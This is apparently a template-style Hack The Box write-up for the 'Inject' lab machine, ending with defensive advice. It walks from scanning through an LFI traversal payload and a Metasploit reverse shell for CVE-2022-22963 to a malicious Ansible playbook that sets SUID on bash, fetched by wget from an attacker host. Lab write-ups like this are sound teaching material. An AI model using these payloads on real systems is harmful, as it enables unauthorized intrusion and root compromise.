# Inject: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-Web%20%2F%20Privilege%20Escalation-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Machine Name** | Inject |
| **Difficulty** | Easy |
| **Platform** | Hack The Box |
| **IP Address** | `10.129.xx.xxx` (dynamic) |
| **Category** | Web / Privilege Escalation |
| **Author** | [Your GitHub Name or Alias] |

---

## Table of Contents

- [Overview](#overview)
- [Initial Enumeration](#initial-enumeration)
- [Web Application Analysis](#web-application-analysis)
- [Exploitation](#exploitation)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Key Takeaways](#key-takeaways)

---

## Overview

This writeup documents the complete exploitation chain for the **Inject** machine on Hack The Box, demonstrating:

- Port scanning and service enumeration
- Web directory brute-forcing and upload functionality analysis
- Discovery and exploitation of Local File Inclusion (LFI)
- Exploitation of **CVE-2022-22963** (Spring Cloud Function RCE)
- Initial shell access via Metasploit
- Lateral movement between users (`frank` → `phil`)
- Privilege escalation via misconfigured Ansible automation
- Capture of user and root flags

---

## Initial Enumeration

### Port Scanning

Performed comprehensive port and version scanning to identify running services:

```bash
nmap -sC -sV -oA inject-scan 10.129.xx.xxx
```

### Open Ports Discovered

| Port | Service | Version/Details |
|------|---------|-----------------|
| **22/tcp** | SSH | OpenSSH |
| **8080/tcp** | HTTP | Nagios NSCA / Web Service |

**Initial Observations:**
- Standard SSH service on port 22
- Web application running on non-standard port 8080
- Potential web attack surface identified

---

## Web Application Analysis

### Web Server Access

Navigated to the web application:

```
http://10.129.xx.xxx:8080
```

### Directory Enumeration

Performed directory brute-forcing to discover hidden endpoints:

```bash
gobuster dir -u http://10.129.xx.xxx:8080 -w /usr/share/wordlists/dirb/common.txt
# OR
ffuf -u http://10.129.xx.xxx:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Key Findings:**
- Upload functionality discovered
- Various accessible directories identified

### Local File Inclusion (LFI) Discovery

Testing the upload feature revealed a **Local File Inclusion (LFI)** vulnerability, allowing arbitrary file reading from the server.

**LFI Testing:**
```bash
# Example LFI payload
http://10.129.xx.xxx:8080/show_image?img=../../../../../../etc/passwd
```

### Framework Identification

Through LFI enumeration, identified the application as running **Spring Cloud Function**: vulnerable to a known RCE exploit.

---

## Exploitation

### CVE-2022-22963: Spring Cloud Function RCE

**Vulnerability Details:**
- **CVE ID:** CVE-2022-22963
- **Component:** Spring Cloud Function
- **Impact:** Remote Code Execution via SpEL injection
- **CVSS Score:** 9.8 (Critical)

### Metasploit Exploitation

Leveraged Metasploit Framework to exploit the vulnerability:

```bash
msfconsole
```

```ruby
use exploit/multi/http/spring_cloud_function_spel_injection
set RHOSTS 10.129.xx.xxx
set RPORT 8080
set LHOST <your_tun0_ip>
set LPORT 4444
show options
exploit
```

**Exploitation Result:**
- Successfully obtained reverse shell ✓
- Initial access as user: **frank**

```bash
[*] Started reverse TCP handler on <your_ip>:4444
[*] Executing exploit...
[*] Sending stage...
[*] Meterpreter session 1 opened
```

---

## Lateral Movement

### Initial User Access

After gaining shell as `frank`, performed system enumeration:

```bash
whoami
# Output: frank

id
# Check group memberships and privileges

ls -la /home
# Enumerate other users on the system
```

### User Enumeration

**Users Discovered:**
- `frank` (current user)
- `phil` (target user)

### Switching to User `phil`

Performed lateral movement to escalate from `frank` to `phil`:

```bash
# Enumerate frank's environment
cd /home/frank
find . -type f 2>/dev/null

# Check for credentials, SSH keys, or configuration files
cat .bash_history
cat .m2/settings.xml  # Maven settings often contain credentials

# Switch to phil
su phil
# OR
ssh phil@localhost
```

**User Flag Retrieved:**

```bash
cat /home/phil/user.txt
```

---

## Privilege Escalation

### Ansible Automation Discovery

Enumeration revealed automation scripts under `/opt/automation/`:

```bash
ls -la /opt/automation/
find /opt/automation -type f -ls
```

**Key Finding:**
- Ansible playbooks running with elevated privileges
- Writable directory or scheduled tasks executing playbooks

### Malicious Playbook Creation

Created a privilege escalation Ansible playbook (`pe.yml`):

```yaml
---
- hosts: localhost
  tasks:
    - name: Privilege escalation via SUID bash
      ansible.builtin.shell: |
        chmod +s /bin/bash
      become: true
```

**Payload Explanation:**
- Sets SUID bit on `/bin/bash`
- Allows execution of bash with root privileges
- `become: true` ensures task runs as root

### Payload Delivery

#### On Attacker Machine

```bash
# Navigate to directory containing pe.yml
cd /path/to/payloads

# Start HTTP server
python3 -m http.server 8000
```

#### On Target Machine (as phil)

```bash
# Download malicious playbook
cd /opt/automation/tasks
wget http://<your_tun0_ip>:8000/pe.yml

# Wait for automated execution or trigger manually
# The Ansible automation will execute the playbook with root privileges
```

### Root Shell Acquisition

After the playbook executes and sets SUID on bash:

```bash
# Execute bash with SUID privileges
bash -p

# Verify root access
whoami
# Output: root

id
# Output: uid=1000(phil) gid=1000(phil) euid=0(root) egid=0(root) groups=0(root)...
```

**Root Access Obtained:** ✓

---

## Flags

### User Flag

```
[USER FLAG HASH]
```

**Path:** `/home/phil/user.txt`

**Retrieved as:** `phil`

### Root Flag

```
[ROOT FLAG HASH]
```

**Path:** `/root/root.txt`

**Retrieved as:** `root`

```bash
cat /root/root.txt
```

---

## Attack Chain Summary

```
Port Scan → Web Enumeration → LFI Discovery → Spring Cloud RCE (CVE-2022-22963)
    ↓
Shell as frank → Lateral Movement → phil user access → User Flag
    ↓
Ansible Automation Discovery → Malicious Playbook Upload → SUID Bash
    ↓
Root Shell → Root Flag
```

---

## Key Takeaways

### Vulnerabilities Exploited

1. **Local File Inclusion (LFI)**
   - Allowed reconnaissance of system files
   - Enabled framework version identification
   - Led to discovery of Spring Cloud Function

2. **CVE-2022-22963 (Spring Cloud Function RCE)**
   - Critical vulnerability in Spring framework
   - Enabled remote code execution via SpEL injection
   - Publicly known exploit available in Metasploit

3. **Credential Exposure**
   - Lateral movement facilitated by exposed credentials
   - Configuration files contained sensitive information
   - Password reuse or weak credential storage

4. **Ansible Automation Misconfiguration**
   - Automated playbook execution with root privileges
   - Writable playbook directory accessible to unprivileged users
   - No integrity checking on executed playbooks

### Technical Lessons

- **Framework vulnerabilities** can provide direct RCE when unpatched
- **Automated systems** running as root require strict access controls
- **Configuration management tools** (Ansible, Puppet, Chef) are high-value targets
- **Lateral movement** often relies on credential reuse or exposed secrets
- **SUID binaries** remain a powerful privilege escalation vector

### Defensive Recommendations

1. **Patch Management**
   - Regularly update Spring Cloud Function and all frameworks
   - Subscribe to security advisories for used components
   - Implement automated vulnerability scanning

2. **Input Validation**
   - Sanitize all user input to prevent LFI attacks
   - Implement whitelist-based file access controls
   - Use secure coding practices for file operations

3. **Automation Security**
   - Restrict write access to automation directories
   - Implement playbook signing and verification
   - Use least-privilege principles for automation accounts
   - Audit automated task execution regularly

4. **Credential Management**
   - Avoid storing plaintext credentials in configuration files
   - Use secret management solutions (Vault, AWS Secrets Manager)
   - Implement credential rotation policies
   - Monitor for credential reuse across services

5. **SUID Binary Auditing**
   - Regularly audit SUID/SGID binaries on systems
   - Remove unnecessary privileged binaries
   - Monitor for unauthorized SUID changes

---

## Tools Used

- **nmap**: Port scanning and service enumeration
- **gobuster** / **ffuf**: Directory brute-forcing
- **Metasploit Framework**: CVE-2022-22963 exploitation
- **Python HTTP Server**: Payload delivery
- **Ansible**: Privilege escalation (via misconfiguration)

---

## References

- [CVE-2022-22963 Details](https://nvd.nist.gov/vuln/detail/CVE-2022-22963)
- [Spring Cloud Function Security Advisory](https://spring.io/security/cve-2022-22963)
- [Ansible Become Privilege Escalation](https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_privilege_escalation.html)

---

## Lessons Learned

- **Unpatched CVEs** in popular frameworks provide easy initial access
- **Configuration management systems** require strict security controls
- **Automated tasks running as root** are prime privilege escalation targets
- **Defense in depth** is critical: multiple security failures enabled full compromise
- **Regular security audits** of automation systems can prevent privilege escalation

---

**Machine Completed:** ✓  
**Date:** [Your completion date]  
**Difficulty Rating:** Easy ⭐  
**Time to Pwn:** [Your time]

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security on any system.*
